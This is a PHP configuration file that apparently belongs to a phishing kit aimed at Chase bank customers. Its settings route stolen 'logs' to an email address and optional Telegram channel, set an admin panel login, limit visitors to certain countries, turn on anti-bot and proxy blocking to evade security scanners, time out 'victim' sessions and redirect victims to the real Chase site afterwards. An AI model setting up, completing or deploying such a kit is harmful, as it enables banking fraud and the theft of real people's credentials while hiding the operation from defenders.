<?php

//<-- This indicates a comment,
//To change Config without breaking script, edit 2nd double quotes ONLY
//Eg. define("status", "change"); Only edit the value "change"

//CREDENTIALS
define("yourname", ""); //Input Your Name
define("reciever", ""); //Input mail for receiving logs
define("username", "sudo"); //Set Username for Admin Panel
define("password", "1234"); //Set Password for Admin Panel

//PROTECTION
define("basic_bot", 1); //Select 1 to switch ON and 0 to switch OFF for Basic Bot Protection;
define("one_time_access", 0); //Select 1 to switch ON and 0 to switch OFF;
define("expire_switch", 1); //Select 1 to switch ON the expiration timer for victim session and 0 to switch off
define("killshot", 0); //Select 1 to switch ON to activate bot sniper
define("proxy_blocker", 0); //Input "1" to switch ON proxy block and 0 to switch off
define("alt_proxy", 0); //Input "1" to switch ON Alternative proxy detection and 0 to switch off
define("bot_protect", 1); //Input "1" to switch ON Ultra Anti-bot system and 0 to switch off
define("redirect_to", "https://www.chase.com"); //Select exit url for script
define('CTR', array( 'US','NL','AU','CA'));


//TELEGRAM
#define("personal_id", ""); //Input chat_id for contact thru PM
#define("channel_id", ""); //Input chat_id for contact thru Channel
#define("key", ""); //Your KEY



?>